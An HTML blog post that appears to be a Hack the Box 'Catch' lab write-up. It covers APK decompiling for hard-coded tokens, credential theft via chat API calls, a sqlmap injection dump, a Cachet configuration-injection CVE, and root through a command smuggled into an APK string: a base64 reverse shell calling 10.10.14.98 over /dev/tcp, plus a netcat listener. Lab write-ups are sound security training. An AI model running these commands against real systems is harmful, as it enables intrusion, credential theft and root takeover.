<!DOCTYPE html>
<html lang="en">
  <head>
    <link rel="stylesheet" href="/blog/syntax-molokai.css">
    <link rel="stylesheet" href="/blog/style.css">
    <meta charset="utf-8">
    <title>Hack the Box: Catch</title>
  </head>

  <style>
    pre {
            overflow-x: auto;
            white-space: pre-wrap;
            white-space: -moz-pre-wrap;
            white-space: -pre-wrap;
            white-space: -o-pre-wrap;
            word-wrap: break-word;
         }
    
    h1 {
      color: #b096f0;
    }

    h2 {
      color: #b096f0;
    }

    h3 {
      color: #b096f0;
    }
      
    h4 {
      color: #b096f0;
    }
  </style>

  <body>
    <center>
      <div style="margin: 10px; max-width: 700px; text-align: left">
        <h1>Hack the Box: Catch</h1>
        <h3>06 Jun 2022</h3>
        <p>Catch is a great example of applying basic APK reversing and CVE exploitation. It’s an application that’s intended to integrate Gitea and Let’s Chat and makes the mistake of using hard-coded credentials and an insecure dashboard.</p>

<h2 id="osint">osint</h2>

<p>Starting with an Nmap scan revealed a number of services running on the target.</p>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>PORT     STATE SERVICE REASON  VERSION
22/tcp   open  ssh     syn-ack OpenSSH 8.2p1 Ubuntu 4ubuntu0.4 <span class="o">(</span>Ubuntu Linux<span class="p">;</span> protocol 2.0<span class="o">)</span>
80/tcp   open  http    syn-ack Apache httpd 2.4.41 <span class="o">((</span>Ubuntu<span class="o">))</span>
3000/tcp open  ppp?    syn-ack
5000/tcp open  upnp?   syn-ack
</code></pre></div></div>

<p>Interestingly, there were two different Apache services, both on different versions, as well as another two ports that were not identified.</p>

<p>Cookies fetched by an Nmap script showed that there was a Gitea server running on port 3000. But the other ports were still unknown.</p>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>Set-Cookie: <span class="nv">i_like_gitea</span><span class="o">=</span>a9634c3d8acdc09d<span class="p">;</span> <span class="nv">Path</span><span class="o">=</span>/<span class="p">;</span> HttpOnly
</code></pre></div></div>

<p>Opening each of the pages in a web browser helped to identify these other services.</p>

<p>The main page on port 80 was a simple landing page for ‘Catch Global Systems’, allowing the user to download an APK file. This would have to be further investigated.</p>

<p>Port 3000 was running Gitea version 1.14.1 with Go 1.16.3 and port 5000 was running <a href="https://github.com/sdelements/lets-chat">Let’s Chat</a>. Both of these were locked with passwords and default credentials did not work.</p>

<p>The last page of interest was a monitoring dashboard running on port 8000 which appeared to be based on Cachet 2.4. Some background research found a few different CVEs which could be useful however they all required an authenticated user and would not be useable at this point.</p>

<h2 id="reverse-engineering">reverse-engineering</h2>

<p>Going back to the APK that was found, Apktool can be used to decompile the binary so that the source code can be browsed in another application such as VSCode.</p>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>apktool d ./catchv1.0.apk
</code></pre></div></div>

<p>According to the landing page that was found earlier, “The future enhancements [include] Lets-chat/Gitea integration”, hinting that there could be API keys or hard-coded credentials in the application to integrate these services.</p>

<p>After looking around, there was one file that stood out based on its contents.</p>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>original/res/values/strings.xml
</code></pre></div></div>

<p>This file contained variables controlling the application name among other things as well as 3 different API keys; Gitea, Let’s Chat and Slack.</p>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>&lt;string <span class="nv">name</span><span class="o">=</span><span class="s2">"gitea_token"</span><span class="o">&gt;</span>b87bfb6345ae72ed5ecdcee05bcb34c83806fbd0&lt;/string&gt;

&lt;string <span class="nv">name</span><span class="o">=</span><span class="s2">"lets_chat_token"</span><span class="o">&gt;</span><span class="nv">NjFiODZhZWFkOTg0ZTI0NTEwMzZlYjE2OmQ1ODg0NjhmZjhiYWU0NDYzNzlhNTdmYTJiNGU2M2EyMzY4MjI0MzM2YjU5NDljNQ</span><span class="o">==</span>&lt;/string&gt;

&lt;string <span class="nv">name</span><span class="o">=</span><span class="s2">"slack_token"</span><span class="o">&gt;</span>xoxp-23984754863-2348975623103&lt;/string&gt;
</code></pre></div></div>

<h2 id="exploitation">exploitation</h2>

<p>Of the 3 tokens, only one seemed to work, which was Let’s Chat. Following the <a href="https://github.com/sdelements/lets-chat/wiki/API">API documentation on Github</a>, Curl could be used to fetch the open rooms.</p>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>curl <span class="nt">-H</span> <span class="s2">"Authorization: bearer NjFiODZhZWFkOTg0ZTI0NTEwMzZlYjE2OmQ1ODg0NjhmZjhiYWU0NDYzNzlhNTdmYTJiNGU2M2EyMzY4MjI0MzM2YjU5NDljNQ=="</span> <span class="nt">-i</span>   http://10.10.11.150:5000/rooms
</code></pre></div></div>
<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>61b86b28d984e2451036eb17 Status
61b8708efe190b466d476bfb Android Development
61b86b3fd984e2451036eb18 Employees
</code></pre></div></div>

<p>And this information could be used to then read messages from the rooms.</p>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>curl <span class="nt">-H</span> <span class="s2">"Authorization: bearer NjFiODZhZWFkOTg0ZTI0NTEwMzZlYjE2OmQ1ODg0NjhmZjhiYWU0NDYzNzlhNTdmYTJiNGU2M2EyMzY4MjI0MzM2YjU5NDljNQ=="</span> <span class="nt">-i</span>   http://10.10.11.150:5000/rooms/61b86b28d984e2451036eb17/messages
</code></pre></div></div>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="s2">"ah sure!"</span>
<span class="s2">"You should actually include this task to your list as well as a part of quarterly audit"</span>
<span class="s2">"Also make sure we've our systems, applications and databases up-to-date."</span>
<span class="s2">"Excellent!"</span>
<span class="s2">"Why not. We've this in our todo list for next quarter"</span>
<span class="s2">"@john is it possible to add SSL to our status domain to make sure everything is secure ?"</span>
<span class="s2">"Here are the credentials </span><span class="sb">`</span>john :  E<span class="o">}</span>V!mywu_69T4C<span class="o">}</span>W<span class="sb">`</span><span class="s2">"</span>
<span class="s2">"Sure one sec."</span>
<span class="s2">"Can you create an account for me ?"</span>
<span class="s2">"Hey Team! I'll be handling the </span><span class="sb">`</span>status.catch.htb<span class="sb">`</span><span class="s2"> from now on. Lemme know if you need anything from me."</span>
</code></pre></div></div>

<p>This conversation revealed some credentials for the status page on port 8000. Testing these credentials on other pages showed that they are only used on this one page.</p>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="s2">"Here are the credentials </span><span class="sb">`</span>john :  E<span class="o">}</span>V!mywu_69T4C<span class="o">}</span>W<span class="sb">`</span><span class="s2">"</span>
</code></pre></div></div>

<p>Using SQLMap, it was possible to dump some more API keys from the database however they did not end up being necessary.</p>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>sqlmap <span class="nt">-u</span> <span class="s2">"http://status.catch.htb:8000/api/v1/components?name=1&amp;1[0]=&amp;1[1]=a&amp;1[2]=&amp;1[3]=or+%27a%27=%3F%20and%201=1)*+--+"</span> <span class="nt">--dbms</span><span class="o">=</span>mysql <span class="nt">-D</span> cachet <span class="nt">-T</span> <span class="nb">users</span> <span class="nt">-C</span> api_key,username <span class="nt">--dump</span>

+----------------------+----------+
| api_key              | username |
+----------------------+----------+
| 7GVCqTY5abrox48Nct8j | john     |
| rMSN8kJN9TPADl2cWv8N | admin    |
+----------------------+----------+
</code></pre></div></div>

<p>Instead, using a CVE for Cachet 2.4, detailed in <a href="https://blog.sonarsource.com/cachet-code-execution-via-laravel-configuration-injection/">this blog post</a>, it was possible to dump the username and password of the configured MySQL database user.</p>

<p>Inputting these strings into the ‘Mail From Address’ field under settings and mail, and refreshing the page, returned the name and password of the user.</p>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="k">${</span><span class="nv">DB_USERNAME</span><span class="k">}</span> <span class="o">=</span> will

<span class="k">${</span><span class="nv">DB_PASSWORD</span><span class="k">}</span> <span class="o">=</span> s2#4Fg0_%3!
</code></pre></div></div>

<p>Now finally, with this information it is possible to connect with SSH and login as Will to read the user flag.</p>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>User Flag: 794e64d1eb9b77178f53792d5a0b60e8
</code></pre></div></div>

<h2 id="privilege-escalation">privilege escalation</h2>

<p>The server was running a wildcard cronjob to execute the APKs in /opt/mdm/apk_bin so it was possible to recompile the apk with shellcode which would be run as a privileged user.</p>

<p>Adding the shellcode to “app_name” gave arbitrary code execution which could be used to start a reverse shell.</p>
<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>/bin/bash <span class="nt">-l</span> <span class="o">&gt;</span> /dev/tcp/10.10.14.98/9001 0&lt;&amp;1 2&gt;&amp;1
</code></pre></div></div>

<p>(strings.xml with Base64 encoded shell code)</p>
<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>Strings.xml
&lt;string <span class="nv">name</span><span class="o">=</span><span class="s2">"app_name"</span><span class="o">&gt;</span>Catch<span class="p">;</span> <span class="nb">echo </span>L2Jpbi9iYXNoIC1sID4gL2Rldi90Y3AvMTAuMTAuMTQuOTgvOTAwMSAwPCYxIDI+JjEK | <span class="nb">base64</span> <span class="nt">-d</span> | bash <span class="nt">-i</span>&lt;/string&gt;
</code></pre></div></div>

<p>And a reverse listener could be started using Netcat on the local machine before uploading the APK to the server.</p>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>nc <span class="nt">-lvp</span> 9001
scp out.apk will@10.10.11.150:/opt/mdm/apk_bin/
</code></pre></div></div>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>listening on <span class="o">[</span>any] 9001 ...
connect to <span class="o">[</span>10.10.14.98] from status.catch.htb <span class="o">[</span>10.10.11.150] 36122

<span class="o">&gt;</span> <span class="nb">id
</span><span class="nv">uid</span><span class="o">=</span>0<span class="o">(</span>root<span class="o">)</span> <span class="nv">gid</span><span class="o">=</span>0<span class="o">(</span>root<span class="o">)</span> <span class="nb">groups</span><span class="o">=</span>0<span class="o">(</span>root<span class="o">)</span>
<span class="o">&gt;</span> <span class="nb">ls
</span>Catch
lets-chat
mdm
reset.sh
root.txt
run.sh
</code></pre></div></div>

      </div>
    </center>
  </body>
</html>